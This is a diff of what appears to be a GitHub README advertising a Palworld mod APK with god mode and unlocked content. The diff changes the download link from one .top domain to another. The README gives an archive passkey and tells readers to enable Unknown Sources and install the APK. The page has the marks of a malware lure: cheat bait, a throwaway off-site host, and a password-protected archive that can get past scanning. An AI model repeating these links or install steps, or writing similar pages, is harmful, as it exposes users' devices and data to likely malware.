@@ -6,7 +6,7 @@ Palworld Mod APK with God Mode, unlimited resources, unlock all Pals, and infini
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Install
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top)** to download.
 2. Enable **Unknown Sources** in settings.
 3. Install the APK.
 4. Launch the game and enjoy.
